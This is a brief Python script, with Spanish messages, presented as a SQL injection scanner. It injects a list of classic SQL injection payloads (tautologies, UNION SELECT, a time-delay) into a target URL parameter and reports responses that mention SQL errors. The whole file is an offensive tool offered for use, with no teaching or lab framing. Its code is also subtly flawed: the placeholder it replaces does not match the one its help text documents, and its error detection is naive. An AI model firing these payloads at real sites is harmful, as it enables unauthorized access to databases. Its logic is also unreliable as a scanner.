#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests
import argparse
from urllib.parse import urljoin, urlencode

banner = """
╔═══════════════════════════════════════════════════════╗
║     ______       _               _                    ║
║    /  ___|     | |             | |                   ║
║    \ `--.  __ _| |_ __ ___   __| |                   ║
║     `--. \/ _` | | '_ ` _ \ / _` |                   ║
║    /\__/ / (_| | | | | | | | (_| |                   ║
║    \____/ \__,_|_|_| |_| |_|\__,_|                   ║
║                                                      ║
║      SQL Injection Automation Tool - v1.0           ║
║            ' OR 1=1 -- -                             ║
╚═══════════════════════════════════════════════════════╝
"""

def mostrar_banner():
    print(banner)

def test_injection(url, param, payload):
    test_url = url.replace(f"{{{param}}}", payload)
    try:
        r = requests.get(test_url, timeout=5)
        return r.text
    except:
        return None

def main():
    mostrar_banner()
    
    parser = argparse.ArgumentParser(description="Sqlmxmap - SQL Injection Scanner")
    parser.add_argument("-u", "--url", required=True, help="URL objetivo (ej: http://test.com/page.php?id={{id}})")
    parser.add_argument("-p", "--param", default="id", help="Parámetro a inyectar (default: id)")
    args = parser.parse_args()
    
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 -- -",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' UNION SELECT NULL-- -",
        "' WAITFOR DELAY '0:0:5'-- -"
    ]
    
    print(f"[*] Escaneando: {args.url}")
    print(f"[*] Parámetro: {args.param}")
    print("[*] Probando payloads...\n")
    
    for payload in payloads:
        print(f"[>] Payload: {payload}")
        response = test_injection(args.url, args.param, payload)
        if response and ("mysql" in response.lower() or "sql" in response.lower() or "syntax" in response.lower()):
            print(f"[!] POSIBLE INYECCIÓN SQL detectada con: {payload}\n")
        else:
            print("[+] Sin anomalías obvias\n")
    
    print("[*] Escaneo completado.")

if __name__ == "__main__":
    main()
